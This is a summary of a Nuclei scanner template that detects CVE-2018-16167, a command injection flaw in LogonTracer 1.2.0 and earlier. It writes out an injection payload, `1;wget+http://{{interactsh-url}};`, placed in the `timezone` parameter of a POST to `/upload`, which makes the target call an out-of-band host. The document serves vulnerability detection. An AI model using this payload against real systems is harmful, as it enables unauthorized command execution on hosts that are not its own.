---
cve_id: CVE-2018-16167
template_path: nuclei-templates/http/cves/2018/CVE-2018-16167.yaml
affected_product: LogonTracer
severity: critical
authentication: none
external_callback: true
affected_versions: <=1.2.0
preconditions: []
poc_classification: rce
---

## Vulnerability

CVE-2018-16167 is a critical remote command injection vulnerability affecting LogonTracer version 1.2.0 and earlier. The vulnerability allows remote attackers to execute arbitrary operating system commands on the target system via unspecified vectors. The flaw is classified as CWE-78 (OS Command Injection) and has a CVSS v3.0 score of 9.8, indicating maximum severity with network-based attack vector, low attack complexity, and no privileges or user interaction required. The vulnerability enables complete compromise of confidentiality, integrity, and availability of the affected system.

## PoC / Detection

Classification: rce

The template detects this vulnerability by sending a POST request to the `/upload` endpoint with a malicious payload in the `timezone` parameter. The payload uses command injection syntax (`1;wget+http://{{interactsh-url}};`) to execute a `wget` command that attempts to contact an attacker-controlled server. The template leverages Interactsh for out-of-band detection, confirming successful command execution when an HTTP callback is received from the target system. This demonstrates that arbitrary commands can be injected and executed through the vulnerable parameter, confirming the presence of the remote command execution vulnerability.

## References

- https://www.exploit-db.com/exploits/49918
- https://nvd.nist.gov/vuln/detail/CVE-2018-16167
- https://jvn.jp/en/vu/JVNVU98026636/index.html
- https://github.com/JPCERTCC/LogonTracer/releases/tag/v1.2.1
- https://github.com/ARPSyndicate/kenzer-templates
